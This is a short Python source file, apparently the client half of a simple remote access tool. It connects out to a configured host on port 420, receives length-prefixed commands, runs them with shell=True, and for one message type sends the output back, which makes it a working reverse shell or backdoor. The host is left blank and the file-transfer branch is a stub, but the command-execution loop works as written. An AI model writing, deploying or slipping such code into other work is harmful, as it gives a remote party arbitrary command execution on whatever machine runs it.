import socket as s
import threading
from os.path import exists
from subprocess import check_output
from time import sleep

HOST = ""
PORT = 420
BUFFER = 1024
FORMAT = "cp850"
ADDR = (HOST, PORT)

client = s.socket(s.AF_INET, s.SOCK_STREAM)
client.connect(ADDR)


def sendMsg(msg):
	sendLength = str(len(msg)).encode("utf-8")
	print(sendLength)
	client.send(sendLength)

	client.send(msg.encode(FORMAT))
	recvMsg()


def process(message):
	ctype = message[0]
	messageLst = message.split(" ")

	if ctype == "p":
		check_output(messageLst, shell=True).decode(FORMAT)
		recvMsg()
	elif ctype == "c":
		messageLst.pop(0)
		comm = check_output(messageLst, shell=True).decode(FORMAT)
		sendMsg(comm)

	elif ctype == "f":
		pass

	else:
		pass


def recvMsg():
	msgLen = int(client.recv(BUFFER).decode(FORMAT))

	if msgLen:
		msg = client.recv(int(msgLen)).decode(FORMAT)
		process(msg)


recvMsg()
